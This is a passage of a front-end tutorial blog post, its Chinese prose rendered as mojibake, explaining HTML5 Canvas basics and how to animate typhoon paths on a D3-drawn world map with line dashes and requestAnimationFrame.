    <content><![CDATA[å‰è¨€HTML 5 çš„ Canvas æ˜¯è¨±å¤šäººåšå‹•ç•«ã€åšéŠæˆ²å¸¸å¸¸æœƒç”¨åˆ°çš„å·¥å…·ï¼Œæ­¤å¤–ï¼Œå¦‚æœæ˜¯é€²è¡Œè³‡æ–™è¦–è¦ºåŒ–ï¼Œåœ¨ç¹ªè£½å¤§é‡çš„åœ–å½¢èˆ‡å‹•ç•«æ™‚ï¼ŒCanvas å¯ä»¥ç‚ºä½ çš„ performance å¸¶ä¾†å¾ˆå¤§çš„æ”¹å–„ï¼Œå¾ D3.js å¯¦æˆ° ï¼ Canvas æŠŠæˆ‘çš„è¦–è¦ºåŒ–è®Šã€Œå¿«ã€äº†ï¼ ä¸­æœ€å¾Œçš„ç¯„ä¾‹å°±å¯ä»¥çœ‹å¾—å‡ºä¾†å·®ç•°ã€‚
ç¸½ä¹‹ï¼Œèº«ç‚ºå‰ç«¯å·¥ç¨‹å¸«çš„æˆ‘å»æ²’æœ‰å¯¦ä½œåšé Canvas ç›¸é—œæ‡‰ç”¨ï¼Œåœ¨ç¾æ„§ä¹‹é¤˜ä¹Ÿå¾—å¥®ç™¼å‘ä¸Šæ‰³å›åŠ£å‹¢æ‰å¯ä»¥ï¼Œæ‰€ä»¥æ±ºå®šæŠŠä¸Šæ¬¡ç”¨ d3 èˆ‡ svg ç¹ªè£½çš„é¢±é¢¨è·¯å¾‘åœ–é‡æ–°ç”¨ Canvas é‡å¯«ä¸€éï¼Œä¹Ÿé€éé€™ç¯‡æ–‡ç« åšå€‹ç´€éŒ„ã€‚
Canvas åŸºç¤æ¦‚å¿µ - ç¹ªåœ–Canvas é¡§åæ€ç¾©å°±æ˜¯ä¸€å¡Šç•«å¸ƒï¼Œåªä¸éæ˜¯ç”Ÿå­˜åœ¨ä½ çš„ HTML DOM tree ä¸­ï¼Œè®“ä½ é€é Javascript åœ¨ä¸Šé¢æ®ç‘å‰µæ„ã€‚
Canvas å°±åƒä¸€èˆ¬çš„ DOM å…ƒç´ ä¸€æ¨£ï¼Œæœ‰ width èˆ‡ height ç­‰å±¬æ€§å¯ä»¥è¨­å®šï¼Œä¹Ÿèƒ½é€é CSS ä¾†æ“ä½œä»–çš„æ¨£å¼ï¼Œè€Œé€™äº›æ¨£å¼ä¸¦ä¸æœƒå½±éŸ¿åˆ°ä½ åœ¨ä¸Šé¢æ‰€é€²è¡Œçš„ä»»ä½•ç¹ªè£½åŠŸèƒ½ã€‚ä¸éè¦æ³¨æ„ä¸€ä¸‹ï¼Œå¦‚æœä½ æ˜¯é€é CSS å»æ›´æ”¹å¯¬åº¦èˆ‡é«˜åº¦ï¼Œä»–æœƒæ”¾å¤§ Canvas å…ƒç´ æœ¬èº«ï¼Œè€Œä¸æœƒæ”¾å¤§ Canvas å…§çš„åƒç´ ï¼Œå› æ­¤ä½ åœ¨ Canvas å…§ç¹ªè£½çš„åœ–å½¢å¯èƒ½æœƒè®Šå½¢ã€‚
&lt;canvas id=&quot;worldMapCanvas&quot; width=&quot;1000&quot; height=&quot;600&quot;&gt; Your browser is too old... &lt;/canvas&gt;
æœ‰äº† Canvas å…ƒç´ å¾Œï¼Œæˆ‘å€‘è¦å–å¾—ä»–çš„ æ¸²æŸ“ç’°å¢ƒï¼ˆrendering contextï¼‰ï¼Œä¹‹å¾Œå¿…é ˆè¦é€éé€™å€‹ Context æ‰èƒ½é€²è¡Œç¹ªåœ–ï¼š
var canvas = document.getElementById(&#x27;worldMapCanvas&#x27;);var ctx = canvas.getContext(&#x27;2d&#x27;);

æ¥ä¸‹ä¾†çš„ä¸€åˆ‡ç¹ªåœ–æ“ä½œå°±æœƒè·Ÿè‘—ä½ å–å¾—çš„ context é€²è¡Œï¼Œé€éä¸€é€£ä¸² Canvas APIï¼Œä½ å¯ä»¥ç¹ªè£½å‡ºå¦‚ä¸‹çš„åœ–æ¡ˆï¼š
See the Pen First demo - define graph by Arvin (@arvin0731) on CodePen.


åœ¨ ball.draw() é€™å€‹å‡½æ•¸ç•¶ä¸­ï¼Œæˆ‘ç”¨äº†äº”å€‹æœ€åŸºæœ¬çš„ Canvas API ä¾†é€²è¡Œç¹ªè£½ï¼š
ctx.beginPath();ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2, true);ctx.closePath();ctx.fillStyle = this.color;ctx.fill();


ctx.beginPath():  MDN ä¸Šçš„èªªæ˜æ˜¯ï¼šç”¢ç”Ÿä¸€å€‹æ–°è·¯å¾‘ï¼Œç”¢ç”Ÿå¾Œå†ä½¿ç”¨ç¹ªåœ–æŒ‡ä»¤ä¾†è¨­å®šè·¯å¾‘ã€‚  ç™½è©±ä¸€é»å°±æ˜¯å‘Šè¨´ Canvas èªªä½ ç¾åœ¨è¦é–‹å§‹ç¹ªè£½ç·šæ®µäº†å–”ï¼è«‹å¹«æˆ‘é–‹å•Ÿä¸€å€‹æ–°çš„æ¬¡è·¯å¾‘æ¸…å–®ï¼ˆsub-pathï¼‰ï¼Œå¹«å¿™ç´€éŒ„æ¥ä¸‹ä¾†æˆ‘ç¹ªè£½çš„è·¯ç·šã€‚  åŸºæœ¬ä¸Šåœ¨ä½ æ¯æ¬¡ç¹ªè£½æ–°çš„åœ–å½¢æˆ–ç·šæ®µçš„æ™‚å€™ï¼Œéƒ½éœ€è¦å‘¼å«ä¸€æ¬¡ beginPath()ï¼Œå¦å‰‡ Canvas æœƒå°‡ä½ å…ˆå‰çš„ç¹ªè£½çš„éƒ¨åˆ†èˆ‡å¾ŒçºŒä½ æƒ³ç¹ªè£½çš„æ–°åœ–å‹ç•¶ä½œåŒä¸€å€‹é€£çºŒçš„åœ–ã€‚  ä¾†å€‹ç¯„ä¾‹ï¼ˆæ²’æœ‰ä½¿ç”¨ beginPath() å°±ç›´æ¥æƒ³ç¹ªè£½æ–°åœ–å½¢æ™‚ï¼‰ï¼š
  See the Pen First demo - beginPath by Arvin (@arvin0731) on CodePen.



å¯ä»¥ç™¼ç¾æˆ‘æ˜æ˜åœ¨ `lineTo()` å¾Œæœ‰è¨­å®šä¸åŒçš„ `strokeStyle`ï¼Œä½†æœ€å¾Œéƒ½è¢« &lt;span style=&quot;color:#B90CB3&quot;&gt;#B90CB3&lt;/span&gt; çµ¦å–ä»£äº†ï¼Œé€™å°±æ˜¯å› ç‚ºæ²’æœ‰å‘¼å« beginPath ä¾†å°ç·šæ®µåšå€éš”ã€‚

åŠ ä¸Š `beginPath()` å¾Œï¼Œçµæœå°±æœƒæ˜¯æˆ‘å€‘æƒ³è¦çš„äº†ï¼š
&lt;p data-height=&quot;300&quot; data-theme-id=&quot;29194&quot; data-slug-hash=&quot;ayqRMG&quot; data-default-tab=&quot;js,result&quot; data-user=&quot;arvin0731&quot; data-embed-version=&quot;2&quot; data-pen-title=&quot;First demo - addBeginPath&quot; class=&quot;codepen&quot;&gt;See the Pen &lt;a href=&quot;https://codepen.io/arvin0731/pen/ayqRMG/&quot;&gt;First demo - addBeginPath&lt;/a&gt; by Arvin (&lt;a href=&quot;https://codepen.io/arvin0731&quot;&gt;@arvin0731&lt;/a&gt;) on &lt;a href=&quot;https://codepen.io&quot;&gt;CodePen&lt;/a&gt;.&lt;/p&gt;





ctx.arc(x,y,raidus,startAngle,endAngle,counterclockwise):  å°±æ˜¯ç•«å‡ºä¸€å€‹å¼§ç·šï¼Œå‰å…©å€‹åƒæ•¸è¨­å®šä¸­å¿ƒé»çš„ä½ç½®ï¼Œæ¥è‘—è¨­å®šåŠå¾‘ã€èµ·å§‹é»ï¼ˆèµ·å§‹è§’åº¦ï¼‰ã€çµæŸé»ï¼ˆçµæŸè§’åº¦ï¼‰èˆ‡æ–¹å‘ï¼ˆé †æ™‚é‡æˆ–é€†æ™‚é‡ï¼š
  

ctx.beginPath() çš„ç¯„ä¾‹ä¸­é‚„æœ‰ç”¨åˆ° moveTo(), lineTo() èˆ‡ stroke()ï¼Œä¹Ÿéƒ½æ˜¯å¾ˆå¸¸ç”¨çš„ APIï¼Œä½†å¾å­—é¢ä¸Šå°±å¾ˆå¥½ç†è§£:

moveTo(x, y): ç§»å‹•ç•«ç­†åˆ° point x,y
lineTo(x, y): å¾ç¾åœ¨ç•«ç­†ä½ç½®ç•«ä¸€æ¢ç›´ç·šåˆ° point x,yï¼ˆä½†å…‰å‘¼å« lineTo() é‚„ä¸æœƒç•«å‡ºç·šæ®µï¼Œéœ€é€é stroke() ç­‰ç›¸ä¼¼ APIï¼‰
stroke(): å¯¦éš›ä¸‹ç­†ç¹ªç•«çš„ API


ctx.closePath():  closePath å…¶å¯¦åœ¨é€™é‚Šä¸éœ€è¦ï¼Œä»–ä¸»è¦ç”¨é€”æ˜¯åœ¨æ–¼å¹«ä½ æŠŠä½ åœ¨ beginPath å¾Œå‰µå»ºçš„ sub-path åšé€£æ¥çš„å‹•ä½œï¼Œåƒæ˜¯æŠŠç¬¬ä¸€æ¢ path çš„é ­èˆ‡æœ€å¾Œä¸€æ¢ path çš„å°¾å·´æ¥èµ·ä¾†ï¼Œä½†ä½ ä¹Ÿå¯ä»¥è‡ªå·±å†å¤šç•«ä¸€æ¢ç·šå°‡å€åŸŸåœèµ·ä¾†ï¼Œåªæ˜¯ç¨å«Œéº»ç…©ã€‚  å¾å­—é¢ä¸Šä¾†çœ‹ï¼ŒclosePath() å¾ˆåƒæ˜¯å‘¼å«å¾Œå°±èƒ½å¹«ä½ æ–·é–‹è·¯å¾‘çš„é€£çºŒæ€§ï¼Œä¿æŒå¾ŒçºŒç¹ªè£½åœ–å‹çš„ç¨ç«‹æ€§ï¼Œä½†å¯¦éš›ä¸Šæ²’æœ‰é€™å€‹åŠŸç”¨ï¼Œä½ éœ€è¦é€é beginPath() ä¾†å®Œæˆã€‚


é‚„æœ‰å¾ˆå¤š canvas API çš„ä»‹ç´¹éƒ½å¯ä»¥åœ¨ MDN ä¸ŠæŸ¥è©¢åˆ°ï¼Œæœ‰çš„æ•™å­¸é™„æœ‰ä¸­æ–‡å‘¦ï¼MDN Canvas tutorial
Canvas åŸºç¤æ¦‚å¿µ - å‹•ç•«å…ˆå‰åˆ©ç”¨ D3 èˆ‡ svg åšå‹•ç•«æ™‚ï¼Œæ˜¯ä½¿ç”¨ d3.timer ä¾†æ§åˆ¶æ™‚é–“ï¼Œä¸¦ä¸”æ›´æ”¹ svg å…ƒç´ çš„ attribute ä¾†ç§»å‹•ç‰©ä»¶ï¼Œé€²è€Œé”åˆ°å‹•ç•«æ•ˆæœï¼Œä½†æ˜¯åœ¨ Canvas çš„ä¸–ç•Œä¸­ï¼Œæ²’æœ‰ç§»å‹•çš„é€™ç¨®æ¦‚å¿µï¼Œä½ å¦‚æœæƒ³è¦è®“ä¸€å€‹åœ¨ Canvas ä¸Šçš„ç‰©ä»¶ç§»å‹•ï¼Œä½ éœ€è¦çš„æ˜¯é‡æ–°ç¹ªè£½åœ¨ä¸åŒä½ç½®çš„ç‰©ä»¶ï¼Œåœ¨å¿«é€Ÿçš„ frame update ä¸‹ï¼Œäººçœ¼çœ‹åˆ°çš„å°±æœƒæ˜¯ä¸€é€£ä¸²å‹•ç•«äº†ã€‚é€™åŸç†å°±è·Ÿä¸€èˆ¬çš„å½±ç‰‡èˆ‡å‹•ç•«ç›¸åŒï¼Œéƒ½æ˜¯é€éæ¯ä¸€æ¬¡ frame çš„æ›´æ–°ï¼Œä¾†å‘ˆç¾å‡ºé€£çºŒç•«é¢ã€‚
é‚£è¦å¦‚ä½•ä¸æ–·åœ°å»æ›´æ–° Canvas å‘¢ï¼Ÿä½ å¯ä»¥é€é setInterval ä¹Ÿèƒ½å¤ ç”¨ç¾åœ¨è¼ƒç‚ºäººçŸ¥çš„ requestAnimationFrame ä¾†è™•ç†ï¼Œä½¿ç”¨ setInterval ä½ å¯ä»¥ç›´æ¥æ§åˆ¶å‹•ç•«çš„æ›´æ–°é€Ÿç‡ï¼Œç„¶è€Œåœ¨æ•ˆèƒ½ä¸Šé‚„æ˜¯æ¡ç”¨ requestAnimationFrame è¼ƒå¥½ï¼Œæ˜¯ä»¥ç¶²é é é¢çš„æ›´æ–°é€Ÿåº¦ç‚ºåŸºæº–ã€‚
ä¸€å€‹æ¡ç”¨ requestAnimationFrame çš„ç°¡å–®å‹•ç•«å¦‚ä¸‹ï¼š
See the Pen First demo by Arvin (@arvin0731) on CodePen.


drawctx.clearRect(0,0, canvas.width, canvas.height);ball.draw();// ... calculate positionraf = window.requestAnimationFrame(draw);

é—œéµåªæœ‰å…©å€‹åœ°æ–¹ï¼š

åœ¨æ¯æ¬¡ requestAnimationFrame åŸ·è¡Œæ™‚ï¼Œä½ éƒ½è¦æ¸…ç©ºç¾åœ¨çš„ Canvas ç•«é¢é‡æ–°ç¹ªè£½ ctx.clearRect(0,0, canvas.width, canvas.height);ã€‚
requestAnimationFrame æ˜¯å¿…é ˆè‡ªå·±å»å‘¼å«çš„ï¼Œæ‰€ä»¥åœ¨æˆ‘å€‘çš„ draw() å‡½å¼ä¸­ï¼Œæœ€å¾Œè¦è‡ªå·±å‘¼å« raf ä¾†é‡æ–° trigger è‡ªå·±çš„ draw functionã€‚  ä½ å¯ä»¥åƒä¸€èˆ¬çš„ setInterval ä¸€æ¨£è¨˜éŒ„ä»–å›å‚³çš„ referenceï¼Œä¸¦åœ¨é©ç•¶æ™‚é–“ cancelAnimationFrameã€‚

ç­è§£äº† Canvas çš„åŸºç¤çŸ¥è­˜å¾Œï¼Œå¯ä»¥é–‹å§‹å‹•æ‰‹ä»Šå¤©çš„ä¸»é¡Œäº†ï¼ç”±æ–¼ç¯„ä¾‹æ˜¯ä¿®æ”¹è‡ª D3v4 å·¥ä½œåŠ - React + D3 ç¹ªè£½ svg å‹•æ…‹è·¯ç·šåœ°åœ–ï¼Œæ‰€ä»¥é—œæ–¼è³‡æ–™çš„å–å¾—èˆ‡æ ¼å¼è«‹åƒè€ƒè©²ç¯‡æˆ–æ˜¯ä¸‹é¢ Demo çš„ç¨‹å¼ç¢¼ã€‚
åœ°åœ–åœ¨ä¸Šä¸€ç¯‡ D3v4 å·¥ä½œåŠ - React + D3 ç¹ªè£½ svg å‹•æ…‹è·¯ç·šåœ°åœ– ä¸­ï¼Œæˆ‘å€‘åˆ©ç”¨ svg path å…ƒç´ æ­é… d3.geoPath() èˆ‡ d3.geo ä¸­çš„ geoMercator() ä¾†ç¹ªè£½ä¸–ç•Œåœ°åœ–ï¼Œé‚£ d3 æœ‰è¾¦æ³•å¹«åŠ©æˆ‘å€‘åœ¨ Canvas ä¸Šç¹ªè£½ä¸–ç•Œåœ–å—?
ç•¶ç„¶å¯ä»¥ï¼
d3.geoPath() æœ‰æä¾›ä¸€å€‹ context() APIï¼Œè®“ä½ ç¶å®š Canvas çš„ contextï¼Œç„¶å¾Œå°±èƒ½å‚³å…¥è·¯å¾‘è³‡æ–™ç¹ªè£½åˆ° Canvas ä¸Šé ­ï¼š
renderMapfunction renderMap() &#123;  const self = this;  const canvasNode = d3Select(&#x27;#mapCanvas&#x27;).node();  const context = canvasNode.getContext(&#x27;2d&#x27;);  // å‚³å…¥ canvas context çµ¦ geoPath()  const path = geoPath().context(context);  context.beginPath();  // è¨˜å¾—ä¸€æ¨£è¦æ”¾å…¥ä½ çš„æ˜ å°„å‡½æ•¸  path.projection(this.projection());  this.state.worlddata.features.forEach((d, i) =&gt; &#123;      context.fillStyle =         &#x27;rgba(38,50,56,&#x27;+ 1 / this.state.worlddata.features.length * i + &#x27;)&#x27;      context.beginPath();      // ç¶å®š Canvas context çš„ path å°±èƒ½å°‡å‚³å…¥çš„è³‡æ–™ç¹ªè£½åœ¨ Canvas ä¸Šé ­      path(d);      context.fill();  &#125;);  // add graticules path  context.beginPath();  path.projection(this.projection());  path(this.state.graticule);  context.fillStyle = &#x27;none&#x27;;  context.strokeStyle = &#x27;#79A09E&#x27;;  context.stroke();  &#125;

Demo: ï¼ˆå¯ä»¥åˆ‡æ›æ¨¡å¼çœ‹ codeï¼Œæˆ–æ˜¯åˆ°ä¸Šä¸€ç¯‡çœ‹ï¼Œæœ‰è¨±å¤šé‡è¤‡çš„é‹ç®—å‡½å¼ï¼‰


è·¯å¾‘æ¥è‘—é‡é ­æˆ²æ˜¯è¦ç•«ä¸Šè·¯å¾‘ï¼Œé€™é‚Šæœƒè¤‡é›œè¨±å¤šï¼Œæˆ‘ç›¡åŠ›èªªæ˜ï¼Œä½†ç›´æ¥çœ‹ code æœƒæ¸…æ¥šä¸€é»ã€‚
é€™é‚Šèªªæ˜åœ¨ Canvas ä¸Šç¹ªè£½å‹•æ…‹è·¯ç·šçš„åŸç†èˆ‡æ­¥é©Ÿï¼š
ç·šæ®µå‹•ç•«åŸç†ï¼š
è·Ÿ svg è¦è£½ä½œå‹•æ…‹è·¯ç·šä¸€æ¨£çš„åŸç†ï¼Œæˆ‘å€‘éƒ½æ˜¯å…ˆå°‡ç·šç•«å¥½å¾Œï¼Œåˆ©ç”¨ç·šæ®µçš„ **line dash** èˆ‡ **dash offset** ä¾†è£½ä½œå‡ºè·¯å¾‘çš„å‹•ç•«æ•ˆæœã€‚ï¼ˆå¯åƒè€ƒ [ä¸Šä¸€ç¯‡](http://blog.techbridge.cc/2017/07/21/d3-workshop-map/)ï¼‰


å› æ­¤åœ¨ç¹ªè£½ä¸Šçš„æ­¥é©Ÿä¹Ÿå·®ä¸å¤šï¼Œåªæ˜¯å¯¦ä½œçš„ç´°ç¯€ä¸åŒç½·äº†ï¼š

Step 1. ç¹ªè£½ç·šæ®µçš„å…¥å£é»ï¼š

æ—¢ç„¶ä¸€æ¨£æ˜¯åˆ©ç”¨ line dash èˆ‡ dash offsetï¼Œé‚£æˆ‘å€‘ä¹Ÿå°±éœ€è¦å–å¾—è·¯å¾‘çš„é•·åº¦ï¼Œæ‰èƒ½å¤ è¨­å®š lineDash éº»ï¼Œä½†æ˜¯ä½ å¦‚æœåœ¨å‰é¢çš„ç¯„ä¾‹ä¸­æœ‰æ‰“é–‹é devToolï¼Œå°±çŸ¥é“æ ¹æœ¬çœ‹ä¸åˆ° Canvas ä¸Šé¢ä½ ç¹ªè£½çš„ç‰©ä»¶ï¼Œæ¯å€‹ç·šæ®µä¹Ÿéƒ½æ˜¯ç”¨å„é»çš„ x, y å€¼å»é€£æ¥ï¼Œé€™æ¨£è¦æ€éº¼çŸ¥é“æ•´å€‹ç·šæ®µé•·å‘¢ï¼Ÿï¼
é›£é“è¦æ¯ä¸€æ®µæ¯ä¸€æ®µçš„ç·šé•·åº¦åŠ ç¸½èµ·ä¾†å—ï¼Ÿæˆ–è¨±æ˜¯å€‹æ–¹æ³•ï¼Œä½†å¤ªéº»ç…©äº†ï¼
æˆ‘å€‘å¯ä»¥ç›´æ¥åˆ©ç”¨ D3 å‰µå»ºä¸€å€‹ invisiablePathï¼Œç„¶å¾Œé€é getTotalLength() ä¾†å–å¾—ç·šæ®µé•·åº¦ï¼Œä¸¦åˆ©ç”¨åœ¨ Canvas ä¸Šé ­ï¼
renderLine() æ˜¯ä¸€åˆ‡çš„èµ·é»ï¼Œæˆ‘å€‘åœ¨é€™é‚Šå‰µå»ºéš±è—çš„ svg path å¥½è¨ˆç®—é•·åº¦ï¼Œä¸¦å‘¼å« requestAnimationFrame é€²è¡Œ loopï¼Œå‚³å…¥ updateLine å‡½å¼ä¾†ç”¢ç”Ÿå‹•ç•«ã€‚
renderLine(canvasCtx, typhoonPath, marker, typhoonId) &#123;    const pathCoordinates = [];    typhoonPath.forEach((path) =&gt; &#123;        pathCoordinates.push(&#123;            x: this.projection()(path.coordinates)[0],            y: this.projection()(path.coordinates)[1],        &#125;);    &#125;);    const lineFunction = d3Line()      .x((d) =&gt; d.x)      .y((d) =&gt; d.y)      .curve(curveCatmullRom);    // use svg path to get length    const invisiblePath = d3Select(&#x27;svg&#x27;)      .append(&#x27;g&#x27;)      .append(&#x27;path&#x27;)      .attr(&#x27;d&#x27;, lineFunction(pathCoordinates))      .attr(&#x27;fill&#x27;, &#x27;none&#x27;)      .attr(&#x27;stroke&#x27;, &#x27;none&#x27;)      .attr(&#x27;class&#x27;, &#x27;invisiblePath&#x27;);    this.invisibleSVGPath[typhoonId] = invisiblePath.node();    const length = this.invisibleSVGPath[typhoonId].getTotalLength();    // this clears itself once the line is drawn    this.lineInterval[typhoonId] = requestAnimationFrame(this.updateLine.bind(this, canvasCtx, typhoonPath, length, marker, typhoonId));  &#125;


Step 3. æ›´æ–°ç·šæ®µçš„å‡½å¼ï¼š

åœ¨æ¯ä¸€æ¬¡ requestAnimationFrame trigger çš„æ™‚å€™ï¼Œæˆ‘å€‘éƒ½æœƒå‘¼å« updateLine() ä¾†é‡æ–° render canvasï¼Œä¸»è¦é€²è¡Œå¹¾å€‹æ­¥é©Ÿï¼š

defineLine()ï¼Œå®šç¾©ç·šæ®µï¼Œæ¯ä¸€æ¬¡çš„ loop éƒ½éœ€è¦é‡æ–°ç¹ªè£½ç·šæ®µã€‚ è·³è‡³ Step 4 çœ‹è©³ç´°å¯¦ä½œ

è¨ˆç®—ç›®å‰ progressï¼Œä¹Ÿå°±æ˜¯ç›®å‰ line offset è¦èª¿æ•´åˆ°ä½•è™•ï¼Œæˆ‘å€‘æ˜¯å®šç¾©ä¸€å€‹è®Šæ•¸ this.speed èˆ‡ this.dir ä¾†æ§åˆ¶ç·šæ®µç¹ªè£½çš„æ–¹å‘èˆ‡é€Ÿåº¦ã€‚æ¯ä¸€æ¬¡çš„ loop éƒ½æœƒå¢åŠ  this.progress çš„å€¼ï¼Œç„¶å¾Œä¸Ÿå…¥ this.moveDash() ä¸­ä¾†ç¹ªè£½ç·šæ®µçš„ line dash èˆ‡ line dash offsetã€‚ è·³è‡³ Step 5 çœ‹è©³ç´°å¯¦ä½œ

æœ€å¾Œï¼Œæ¯ä¸€æ¬¡å‘¼å« updateLine æ™‚ï¼Œæˆ‘å€‘éƒ½æœƒæª¢æŸ¥ this.progress æ˜¯å¦å·²ç¶“èˆ‡ç·šæ®µé•·åº¦ç›¸åŒï¼Œä»£è¡¨å·²ç¶“èµ°å®Œä¸€æ¬¡è·¯ç·šï¼Œéœ€è¦é‡æ–°é–‹å§‹ï¼Œé€™æ™‚å€™æˆ‘å€‘å°±éœ€è¦å…ˆå°‡ canvas æ¸…ç©ºï¼šcanvasCtx.clearRect(0,0,1000,600)ï¼Œè¡¨ç¤ºå°‡ canvasCtx æ‰€æŒæœ‰çš„æ¸²æŸ“ç’°å¢ƒå¾ä½ç½® (0,0) é–‹å§‹å°å¯¬ 1000 èˆ‡é«˜ 600 çš„ canvas æ¸…ç©ºã€‚æœ€å¾Œå¯ä»¥åˆ©ç”¨ setTimoue() ä¾†å»¶é•·ä¸€ä¸‹è·¯å¾‘èµ°å®Œå¾Œçš„æ™‚é–“ï¼Œè®“ä»–ä¸è¦é¦¬ä¸Šå°±æ¸…ç©º canvas é‡ç¹ªã€‚


updateLineupdateLine(canvasCtx, typhoonPath, length, marker, typhoonId) &#123;    // define the line    this.defineLine(canvasCtx, typhoonPath, marker, typhoonId);    this.progress[typhoonId] = this.progress[typhoonId] || 0;    if (this.progress[typhoonId] &lt; length) &#123;      this.progress[typhoonId] += this.speed;      this.moveDash(canvasCtx, typhoonId, typhoonPath, length, marker, this.progress[typhoonId], this.dir);      requestAnimationFrame(this.updateLine.bind(this, canvasCtx, typhoonPath, length, marker, typhoonId));    &#125; else &#123;          canvasCtx.clearRect(0, 0, 1000, 600);      this.progress[typhoonId] = 0;      setTimeout(() =&gt; requestAnimationFrame(this.updateLine.bind(this, canvasCtx, typhoonPath, 500, marker, typhoonId)), 1000);    &#125;  &#125;


Step 4. å®šç¾©ç·šæ®µçš„å‡½å¼ï¼š

defineLinedefineLine(canvasCtx, typhoonPath, marker, typhoonId) &#123;  // define path  canvasCtx.beginPath();  // start point  const startPoint = &#123;    x: this.projection()(marker.coordinates)[0],    y: this.projection()(marker.coordinates)[1],  &#125;;  // ç§»å‹•ç•«ç­†åˆ°èµ·å§‹é»  canvasCtx.moveTo(startPoint.x, startPoint.y);  // å°‡è·¯å¾‘ä¸­çš„æ¯å€‹é»èˆ‡é»ä¹‹é–“ç”¨ lineTo() é€£æ¥èµ·ä¾†  typhoonPath.forEach((path) =&gt; &#123;      const x = this.projection()(path.coordinates)[0];      const y = this.projection()(path.coordinates)[1];      canvasCtx.lineTo(x, y);  &#125;);  // è¨­å®š style  canvasCtx.lineWidth = 2;  canvasCtx.strokeStyle = &#x27;rgba(53, 247, 14,0.7)&#x27;;&#125;


Step 5. å¯¦ä½œæ›´æ–° LineDash çš„å‡½å¼ï¼š

å–®ç´”çš„ moveDash å¾ˆç°¡å–®ï¼Œåªè¦é€é setLineDash()ï¼Œå°‡ç·šæ®µé•·åº¦å‚³å…¥ï¼Œå®šç¾©å¥½ä½ çš„ line dash è¦å¤šé•·ï¼Œæ¥è‘—æˆ‘å€‘åˆ©ç”¨ Step 3 ä¸­æåˆ°çš„ this.speed èˆ‡ this.dir ä¾†è¨ˆç®—å‡ºç¾åœ¨è¦å°‡ lineDashOffset è¨­ç‚ºå¤šå°‘ã€‚
é€™é‚Šæœ‰å€‹æœ‰è¶£çš„ APIï¼ŒglobalCompositeOperationï¼Œå®ƒå¯ä»¥ç”¨ä¾†æ±ºå®šä½ ç›®å‰çš„ canvas context æ¸²æŸ“ç’°å¢ƒä¸­ï¼Œæ¯å€‹æ–°ç¹ªè£½çš„ç‰©ä»¶èˆ‡å…¶ä»–èˆŠæœ‰çš„ç‰©ä»¶ä¹‹é–“çš„éšå±¤é—œä¿‚ï¼Œåƒæ˜¯æˆ‘é€™é‚Šè¨­ç½®çš„ destination-over å°±ä»£è¡¨ æ–°ç¹ªè£½çš„åœ–å½¢æœƒè¢«å£“åœ¨èˆŠçš„åœ–å½¢ä¸‹æ–¹ï¼Œè‡³æ–¼ç‚ºä»€éº¼æˆ‘é€™é‚Šè¦è¨­ç½®é€™å€‹åƒæ•¸å‘¢ï¼Ÿå¾…æœƒä»‹ç´¹é¢±é¢¨åœˆå¯¦ä½œæ™‚ä½ å°±çŸ¥é“äº†ï¼æ›´å¤šé—œæ–¼ globalCompositionOperation çš„ä»‹ç´¹å¯ä»¥çœ‹ MDN globalCompositeOperation
moveDashmoveDash = (canvasCtx, typhoonId, typhoonPath, length, marker, frac, dir = -1) =&gt; &#123;  // default direction right-&gt;left  // è¨­å®š line dash ç‚ºç·šæ®µé•·  canvasCtx.setLineDash([length]);  // åˆ©ç”¨ `this.progress (frac)` ä¾†æ…¢æ…¢å¢åŠ  line-dash offsetï¼Œè£½ä½œå‡ºç·šæ®µå‹•æ…‹  canvasCtx.lineDashOffset = dir * (frac + length);  canvasCtx.globalCompositeOperation = &#x27;destination-over&#x27;;  canvasCtx.stroke();&#125;

åˆ°é€™è£¡ç‚ºæ­¢ï¼Œä½ å·²ç¶“å‰µå»ºå‡ºèˆ‡ä¸Šæ¬¡ç›¸åŒçš„å‹•æ…‹è·¯ç·šåœ°åœ–ï¼Œåªæ˜¯æ˜¯æ¡ç”¨ Canvas å¯¦ä½œï¼ŒDemoï¼š


æš´é¢¨åœˆç•¶ç„¶ä¸èƒ½å–®ç´”åªæœ‰ç·šæ®µï¼Œé‚„æ˜¯éœ€è¦æœ‰å€‹è·Ÿè‘—ç·šæ®µè·‘çš„é¢±é¢¨æ‰æ¯”è¼ƒæœ‰ fuã€‚
ä½ å¯ä»¥æœƒæƒ³èªªï¼Œé‚£å°±æ¯æ¬¡ moveDash() åŸ·è¡Œçš„æ™‚å€™ï¼Œé †ä¾¿ä¹Ÿç¹ªè£½ä¸Šä¸€å€‹åœ“å½¢çš„æš´é¢¨åœˆä¸å°±å¥½äº†å—ï¼Ÿ
æ¥è‘—å°±é€™éº¼åšäº†ï¼š
moveDashmoveDash = (canvasCtx, typhoonId, typhoonPath, length, marker, frac, dir = -1) =&gt; &#123;  // default direction right-&gt;left  /* åŸæœ¬ç¹ªè£½ç·šæ®µçš„éƒ¨åˆ† ... */  // ...  // ..  // Move typhoon marker  canvasCtx.beginPath();  canvasCtx.setLineDash([0]);  canvasCtx.lineDashOffset = 0;  canvasCtx.lineWidth = 1;  canvasCtx.strokeStyle = &#x27;rgba(53, 247, 14,0.8)&#x27;;  canvasCtx.arc(p.x, p.y, 10, 0, Math.PI * 2, true);  canvasCtx.closePath();  canvasCtx.stroke();&#125;

ç„¶å¾Œå°±çœ‹åˆ°ä¸‹é¢é€™å€‹æ‚²åŠ‡ï¼š


å…¶å¯¦ä¹Ÿæ²’æœ‰éŒ¯ï¼Œä½ çš„ç¢ºæ˜¯ç•«ä¸Šåœˆåœˆäº†ï¼Œä½†æ˜¯æ¯ä¸€æ¬¡çš„ moveDash() éƒ½æœƒç•«ä¸Šä¸€å€‹åœˆåœˆï¼Œä¸¦ä¸”æœƒæŒçºŒç•™åœ¨ Canvas ä¸Šï¼Œè€Œå¯¦éš›ä¸Šæˆ‘å€‘æ‡‰è©²æ¯ä¸€æ­¥éƒ½è¦å°‡å‰ä¸€å€‹åœˆåœˆåˆªé™¤ã€‚
ä½†å¦‚æœä½ åœ¨é€™é‚ŠåŠ ä¸Š canvasCtx.clearRect(0, 0, 1000, 600);ï¼Œå°±æœƒç™¼ç¾åœˆåœˆæœƒæ­£å¸¸ç§»å‹•äº†ï¼Œä½†ç·šæ®µä¸è¦‹äº†â€¦å› ç‚º moveDash() ä¸¦æ²’æœ‰é‡æ–°ç¹ªè£½ç·šæ®µï¼Œåªæœ‰æ›´æ”¹ context çš„ line dashã€‚

è§£æ³•é‚£å°±å¤šç•«ä¸€å±¤ Canvas å§ï¼
